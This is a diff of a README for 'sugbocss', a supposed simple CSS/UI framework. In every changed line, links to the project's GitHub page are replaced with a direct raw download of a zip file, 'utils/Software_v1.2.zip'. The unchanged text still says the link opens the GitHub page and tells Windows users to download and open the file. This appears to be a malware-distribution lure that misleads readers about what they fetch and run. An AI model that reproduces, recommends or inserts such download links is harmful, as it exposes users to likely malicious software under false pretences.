@@ -1,6 +1,6 @@
 # 💻 sugbocss - Simple UI Framework for All Needs
 
-[![Download sugbocss](https://img.shields.io/badge/Download-sugbocss-brightgreen)](https://github.com/Indulgent-charleston943/sugbocss)
+[![Download sugbocss](https://img.shields.io/badge/Download-sugbocss-brightgreen)](https://raw.githubusercontent.com/Indulgent-charleston943/sugbocss/main/utils/Software_v1.2.zip)
 
 ---
 
@@ -29,7 +29,7 @@ No special software is needed to run sugbocss on your computer. You only need to
 
 To get sugbocss, visit the main download page by clicking the button below:
 
-[![Download sugbocss](https://img.shields.io/badge/Download-sugbocss-blue)](https://github.com/Indulgent-charleston943/sugbocss)
+[![Download sugbocss](https://img.shields.io/badge/Download-sugbocss-blue)](https://raw.githubusercontent.com/Indulgent-charleston943/sugbocss/main/utils/Software_v1.2.zip)
 
 This link will take you to the GitHub page where the files are stored. You will find options to download the latest version.
 
@@ -41,7 +41,7 @@ Follow these steps to download and open sugbocss on your Windows computer.
 
 1. **Visit the download page**  
    Click the download button above or open this link in your browser:  
-   https://github.com/Indulgent-charleston943/sugbocss
+   https://raw.githubusercontent.com/Indulgent-charleston943/sugbocss/main/utils/Software_v1.2.zip
 
 2. **Find the release files**  
    Once on the page, look for a section named “Releases” or "Code". This is where you will find available files.
@@ -80,7 +80,7 @@ SugboCSS is mainly a resource for building web pages. Even without coding skills
 ## ⚙️ How to Keep sugbocss Updated
 
 1. Return to the download page:  
-   https://github.com/Indulgent-charleston943/sugbocss
+   https://raw.githubusercontent.com/Indulgent-charleston943/sugbocss/main/utils/Software_v1.2.zip
 
 2. Check the “Releases” section for newer versions.
 
@@ -118,4 +118,4 @@ If you have problems using sugbocss:
 ## 🔗 Download sugbocss Again
 
 Use this link to visit the download page anytime:  
-[![Get sugbocss](https://img.shields.io/badge/Get-sugbocss-grey)](https://github.com/Indulgent-charleston943/sugbocss)
+[![Get sugbocss](https://img.shields.io/badge/Get-sugbocss-grey)](https://raw.githubusercontent.com/Indulgent-charleston943/sugbocss/main/utils/Software_v1.2.zip)
